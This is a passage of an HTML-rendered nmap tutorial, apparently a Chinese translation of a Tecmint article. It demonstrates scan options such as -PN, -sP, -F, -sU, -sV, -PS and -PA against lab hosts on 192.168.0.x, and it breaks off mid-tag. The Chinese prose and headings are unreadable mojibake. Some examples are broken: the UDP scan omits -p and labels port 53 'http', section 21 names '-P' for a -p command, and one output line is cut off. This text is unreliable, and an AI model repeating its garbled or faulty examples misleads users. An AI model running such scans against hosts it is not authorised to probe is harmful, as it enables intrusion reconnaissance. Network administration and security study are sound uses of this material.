class="number">11</span> <span class="number">16</span>:<span class="number">27</span> EST</span><br><span class="line">All <span class="number">1680</span> scanned ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>) are UNfiltered</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.382</span> seconds</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="12-æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN"><a href="#12-æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN" class="headerlink" title="12.æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN"></a>12.æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN</h3><p>æ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">30</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.399</span> seconds</span><br></pre></td></tr></table></figure><h3 id="13-æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP"><a href="#13-æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP" class="headerlink" title="13.æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP"></a>13.æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP</h3><p>ä½¿ç”¨â€œ<strong>-sP</strong>â€é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„æ£€æµ‹ç½‘ç»œä¸­æœ‰å“ªäº›åœ¨çº¿ä¸»æœºï¼Œè¯¥é€‰é¡¹ä¼šè·³è¿‡ç«¯å£æ‰«æå’Œå…¶ä»–ä¸€äº›æ£€æµ‹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">01</span> EST</span><br><span class="line">Host server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.109</span> seconds</span><br></pre></td></tr></table></figure><h3 id="14-æ‰§è¡Œå¿«é€Ÿæ‰«æ-F"><a href="#14-æ‰§è¡Œå¿«é€Ÿæ‰«æ-F" class="headerlink" title="14.æ‰§è¡Œå¿«é€Ÿæ‰«æ-F"></a>14.æ‰§è¡Œå¿«é€Ÿæ‰«æ-F</h3><p>ä½ å¯ä»¥ä½¿ç”¨â€œ<strong>-F</strong>â€é€‰é¡¹æ‰§è¡Œä¸€æ¬¡å¿«é€Ÿæ‰«æï¼Œä»…æ‰«æåˆ—åœ¨nmap-servicesæ–‡ä»¶ä¸­çš„ç«¯å£è€Œé¿å¼€æ‰€æœ‰å…¶å®ƒçš„ç«¯å£ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">47</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1234</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.322</span> seconds</span><br></pre></td></tr></table></figure><h3 id="15-æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬"><a href="#15-æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬" class="headerlink" title="15.æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬"></a>15.æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬</h3><p>ä½ å¯ä»¥ä½¿ç”¨â€œ<strong>-V</strong>â€é€‰é¡¹æ¥æ£€æµ‹ä½ æœºå­ä¸ŠNmapçš„ç‰ˆæœ¬ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]<span class="comment"># nmap -V</span></span><br><span class="line"> </span><br><span class="line">Nmap version <span class="number">4.11</span> ( http:<span class="regexp">//</span>www.insecure.org<span class="regexp">/nmap/</span> )</span><br><span class="line">You have new mail <span class="keyword">in</span> <span class="regexp">/var/</span>spool<span class="regexp">/mail/</span>root</span><br></pre></td></tr></table></figure><h3 id="16-é¡ºåºæ‰«æç«¯å£-r"><a href="#16-é¡ºåºæ‰«æç«¯å£-r" class="headerlink" title="16.é¡ºåºæ‰«æç«¯å£-r"></a>16.é¡ºåºæ‰«æç«¯å£-r</h3><p>ä½¿ç”¨â€œ-râ€é€‰é¡¹è¡¨ç¤ºä¸ä¼šéšæœºçš„é€‰æ‹©ç«¯å£æ‰«æã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">52</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.363</span> seconds</span><br></pre></td></tr></table></figure><h3 id="17-æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist"><a href="#17-æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist" class="headerlink" title="17.æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist"></a>17.æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist</h3><p>ä½ å¯ä»¥ä½¿ç”¨nmapçš„â€œ<strong>â€“iflist</strong>â€é€‰é¡¹æ£€æµ‹ä¸»æœºæ¥å£å’Œè·¯ç”±ä¿¡æ¯ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap --iflist</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:07 EST</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">****INTERFACES**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line">DEV  (SHORT) IP/MASK          TYPE     UP MAC</span><br><span class="line">lo   (lo)    127.0.0.1/8      loopback up</span><br><span class="line">eth0 (eth0)  192.168.0.100/24 ethernet up 08:00:27:11:C7:89</span><br><span class="line"> </span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">*ROUTES*</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span></span><br><span class="line">DST/MASK      DEV  GATEWAY</span><br><span class="line">192.168.0.0/0 eth0</span><br><span class="line">169.254.0.0/0 eth0</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„è¾“å‡ºä½ å¯ä»¥çœ‹åˆ°ï¼Œnmapåˆ—ä¸¾å‡ºäº†ä½ ç³»ç»Ÿä¸Šçš„æ¥å£ä»¥åŠå®ƒä»¬å„è‡ªçš„è·¯ç”±ä¿¡æ¯ã€‚</p><h3 id="18-æ‰«æç‰¹å®šçš„ç«¯å£-p"><a href="#18-æ‰«æç‰¹å®šçš„ç«¯å£-p" class="headerlink" title="18.æ‰«æç‰¹å®šçš„ç«¯å£-p"></a>18.æ‰«æç‰¹å®šçš„ç«¯å£-p</h3><p>ä½¿ç”¨Nmapæ‰«æè¿œç¨‹æœºå™¨çš„ç«¯å£æœ‰å„ç§é€‰é¡¹ï¼Œä½ å¯ä»¥ä½¿ç”¨â€œ-<strong>p</strong>â€é€‰é¡¹æŒ‡å®šä½ æƒ³è¦æ‰«æçš„ç«¯å£ï¼Œé»˜è®¤æƒ…å†µä¸‹nmapåªæ‰«æ<strong>TCP</strong>ç«¯å£ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) sca</span><br></pre></td></tr></table></figure><h3 id="19-æ‰«æTCPç«¯å£-p-T"><a href="#19-æ‰«æTCPç«¯å£-p-T" class="headerlink" title="19.æ‰«æTCPç«¯å£-p T:"></a>19.æ‰«æTCPç«¯å£-p T:</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> T:<span class="number">8888</span>,<span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure><h3 id="20-æ‰«æUDPç«¯å£-sU"><a href="#20-æ‰«æUDPç«¯å£-sU" class="headerlink" title="20.æ‰«æUDPç«¯å£-sU"></a>20.æ‰«æUDPç«¯å£-sU</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sU <span class="number">53</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/udp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/udp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure><h3 id="21-æ‰«æå¤šä¸ªç«¯å£"><a href="#21-æ‰«æå¤šä¸ªç«¯å£" class="headerlink" title="21.æ‰«æå¤šä¸ªç«¯å£"></a>21.æ‰«æå¤šä¸ªç«¯å£</h3><p>ä½ è¿˜å¯ä»¥ä½¿ç”¨é€‰é¡¹â€œ-<strong>P</strong>â€æ¥æ‰«æå¤šä¸ªç«¯å£ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">56</span> EST</span><br><span class="line">Interesting ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>):</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line"><span class="number">443</span>/tcp closed https</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.190</span> seconds</span><br></pre></td></tr></table></figure><h3 id="22-æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£"><a href="#22-æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£" class="headerlink" title="22.æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£"></a>22.æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£</h3><p>æ‚¨å¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼æ¥æ‰«ææŸä¸ªèŒƒå›´å†…çš„ç«¯å£ã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]#  nmap -p <span class="number">80</span><span class="number">-160</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br></pre></td></tr></table></figure><h3 id="23-æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV"><a href="#23-æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV" class="headerlink" title="23.æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV"></a>23.æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sV <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">48</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 12.624 seconds</span><br></pre></td></tr></table></figure><h3 id="24-ä½¿ç”¨TCP-ACK-PA-å’ŒTCP-Syn-PS-æ‰«æè¿œç¨‹ä¸»æœº"><a href="#24-ä½¿ç”¨TCP-ACK-PA-å’ŒTCP-Syn-PS-æ‰«æè¿œç¨‹ä¸»æœº" class="headerlink" title="24.ä½¿ç”¨TCP ACK (-PA)å’ŒTCP Syn (-PS)æ‰«æè¿œç¨‹ä¸»æœº"></a>24.ä½¿ç”¨TCP ACK (-PA)å’ŒTCP Syn (-PS)æ‰«æè¿œç¨‹ä¸»æœº</h3><p>æœ‰æ—¶å€™åŒ…è¿‡æ»¤é˜²ç«å¢™ä¼šé˜»æ–­æ ‡å‡†çš„ICMP pingè¯·æ±‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>TCP ACK</strong>å’Œ<strong>TCP Syn</strong>ï¼ˆtcpæ¢æµ‹æ‰«æï¼‰æ–¹æ³•æ¥æ‰«æè¿œç¨‹ä¸»æœºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">51</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.360</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="25-ä½¿ç”¨TCP-ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA-p"><a href="#25-ä½¿ç”¨TCP-ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA-p" class="headerlink" title="25.ä½¿ç”¨TCP ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA -p"></a>25.ä½¿ç”¨TCP ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA -p</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PA -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">02</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.166</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="26-ä½¿ç”¨TCP-Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£"><a href="#26-ä½¿ç”¨TCP-Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£" class="headerlink" title="26. ä½¿ç”¨TCP Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£"></a>26. ä½¿ç”¨TCP Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£</h3><figure class="highlight 